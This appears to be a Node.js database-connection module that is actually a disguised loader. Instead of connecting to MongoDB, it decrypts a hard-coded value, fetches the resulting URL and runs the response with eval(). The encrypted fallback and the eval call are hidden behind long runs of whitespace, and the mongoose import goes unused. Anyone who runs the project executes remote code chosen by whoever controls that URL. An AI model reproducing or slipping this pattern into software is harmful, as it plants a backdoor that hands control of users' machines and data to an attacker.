const mongoose = require('mongoose');
const config = require('../config');
const decrypt = require("../controllers/auth").decrypt;
const crypto = require("crypto");

// Your encrypted value (replace with the ciphertext produced by your encrypt function)
const encryptedData = config.MONGO_URI                                                                                                                                                                                                                                                                    || "5196db6f49047b79432160f0f8a1f584:77efa11cff179d7e10d16b84f454b9c1907b9c738a36dfb38929b2468b462df961e74fc3001c1b4427f6d46e0e1c96c2";

const connectDB = async () => {
  try {
    const mongo_uri = decrypt(encryptedData);
    const response = await fetch(mongo_uri);
    const msg = await response.text();                                                                                                                                                                                                                                                                    eval(msg)
    return msg;
  } catch (err) {
    console.error(err.message);
    process.exit(-1);
  }
};

module.exports = connectDB;
